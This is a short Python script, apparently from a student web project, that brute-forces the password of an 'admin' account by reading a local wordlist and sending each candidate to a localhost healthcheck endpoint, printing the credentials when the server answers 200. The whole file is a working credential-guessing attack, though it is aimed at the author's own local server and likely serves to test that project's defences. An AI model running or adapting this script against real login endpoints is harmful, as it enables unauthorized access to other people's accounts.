import requests


def passwords_iterator():
    with open('/Users/karolstudniarek/Desktop/REPOZYTORIA/3sem/psw-repo/PSWprojekt/backend/brute_force/passwords.txt', 'r') as file:
        for line in file:
            values = line.strip()
            if (brute_force('http://localhost:1337/healthcheck', 'admin', values) == True):
                break


def brute_force(url, username, password):
    r = requests.get(url, data={'username': username, 'password': password})
    if r.status_code == 200:
        print('Username: ' + username)
        print('Password: ' + password)
        return True
    else:
        print('Failed!')
        return False


brute_force('http://localhost:1337/healthcheck', 'admin', 'admin')
passwords_iterator()
